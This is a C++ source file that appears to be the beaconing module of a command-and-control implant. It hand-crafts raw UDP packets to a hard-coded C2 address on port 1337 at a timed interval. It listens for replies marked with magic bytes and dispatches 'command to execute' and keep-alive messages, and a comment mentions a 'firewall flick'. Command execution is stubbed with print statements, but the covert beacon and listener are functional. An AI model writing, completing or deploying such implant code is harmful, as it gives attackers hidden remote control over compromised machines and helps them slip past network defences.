#include "BPHelper.hpp"

using namespace PacketParse;
using namespace std;

int BPHelper::actionResponse(unique_ptr<info_t> eventInfo) {
    switch (eventInfo->bpHeader.header_type) {
        case 0x02:
            //execute command then respond
            cout << "Received a Command to Execute" << endl;
            return 1;
        case 0x04:
            //keep alive for future use
            cout << "Received a Keep Alive" << endl;
            return 1;
        default:
            cout << "Not a Command or Keep Alive" << endl;
            return -1;
    }
}

void BPHelper::requestAction() {
    ether_header_t ether_header{};
    ip_header_t ip_header{};
    udp_header_t udp_header{};
    bp_header_t bpHeader{};
    bp_command_request_t bp_command_request_header{};

    bpHeader.header_type = 0x01;

    bp_command_request_header.target_OS = 0x01;

    uint16_t udp_len = (uint16_t) sizeof(bpHeader) + (uint16_t) sizeof(bp_command_request_header) +
                       (uint16_t) sizeof(udp_header);
    udp_header.length = htons(udp_len);
    udp_header.dst_port = htons(1337);
    udp_header.src_port = htons(1337);
    udp_header.checksum = htons(0xDEAD);

    ip_header.ver_ihl = 0x45;
    ip_header.total_length = htons(udp_len + (uint16_t) sizeof(ip_header));
    ip_header.id = htons(0xda80);
    ip_header.flags_fo = htons(0x0000);
    ip_header.ttl = 0x80;
    ip_header.protocol = 0x11;
    ip_header.checksum = htons(0x0000);
    ip_header.tos = 0x00;
    ip_header.src_addr = rawSocket.getIP();
    ip_header.dst_addr = htonl(C2IP);

#ifdef __unix__
    memcpy(ether_header.dst_mac, nextHopMac.data(), 6);
    memcpy(ether_header.src_mac, rawSocket.getMac(), 6);
    ether_header.type = htons(0x0800);
    auto ether_ptr = reinterpret_cast<unsigned char *>(&ether_header);
#endif

    auto ip_ptr = reinterpret_cast<unsigned char *>(&ip_header);
    auto udp_ptr = reinterpret_cast<unsigned char *>(&udp_header);
    auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
    auto bp_ptr = reinterpret_cast<unsigned char *>(&bp_command_request_header);

#ifdef __unix__
    Packet req(ether_ptr, ether_ptr + sizeof(ether_header));
    req.insert(req.end(), ip_ptr, ip_ptr + sizeof(ip_header));
#else
    Packet req(ip_ptr, ip_ptr + sizeof(ip_header));
#endif
    req.insert(req.end(), udp_ptr, udp_ptr + sizeof(udp_header));
    req.insert(req.end(), bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
    req.insert(req.end(), bp_ptr, bp_ptr + sizeof(bp_command_request_header));

#if defined(_WIN32) || defined(WIN32)
    //Firewall Flick
    rawSocket.send(req);
#else
    socketMutex.lock();
    rawSocket.send(req);
    socketMutex.unlock();
#endif
}

BPHelper::BPHelper() {
#ifdef __unix__
    rawSocket = RawSocket(C2IPSTR, false, true);
#elif defined(_WIN32) || defined(WIN32)
    rawSocket = RawSocket(false);
#endif
    if(useGateway){
        nextHopMac = rawSocket.getMacOfIP(GatewayIP);
    }else{
        nextHopMac = rawSocket.getMacOfIP(C2IP);
    }
}

void BPHelper::Receive() {
    while (true) {
        rawSocket.receive();
        Packet packet = rawSocket.getPacket();
        if(!packet.empty()) {
            unique_ptr<info_t> info = parsePacket(packet);
            if (info->bpHeader.magic_bytes == MAGIC_BYTES) {
                socketMutex.lock();
                actionResponse(move(info));
                socketMutex.unlock();
            }
        }
    }
}

void BPHelper::requestActionLoop(int interval) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(interval));
        this->requestAction();
    }
}

void BPHelper::requestActionThread() {
    thread t1(&BPHelper::requestActionLoop, this, requestActionInterval);
    t1.detach();
}


